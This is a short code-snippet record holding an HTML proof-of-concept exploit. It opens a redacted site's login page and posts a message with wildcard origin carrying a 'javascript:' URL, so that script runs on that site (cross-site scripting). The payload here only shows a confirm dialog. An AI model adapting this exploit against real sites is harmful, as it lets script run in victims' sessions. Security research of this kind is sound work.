---
id: 3f906dfd-2103-425c-adb0-94b55d5bc31c
type: code
language: HTML
verified: false
created_at: '2023-04-06T03:56:42.174142+00:00'
updated_at: '2023-04-10T20:21:54.099706+00:00'
---

# Code Snippet 3f906dfd

**Language**: HTML

```html
<html>
<body>
    <input type=button value="Click Me" id="btn">
</body>

<script>
document.getElementById('btn').onclick = function(e){
    window.poc = window.open('http://www.redacted.com/#login');
    setTimeout(function(){
        window.poc.postMessage(
            {
                "sender": "accounts",
                "url": "javascript:confirm('XSS')",
            },
            '*'
        );
    }, 2000);
}
</script>
</html>
```
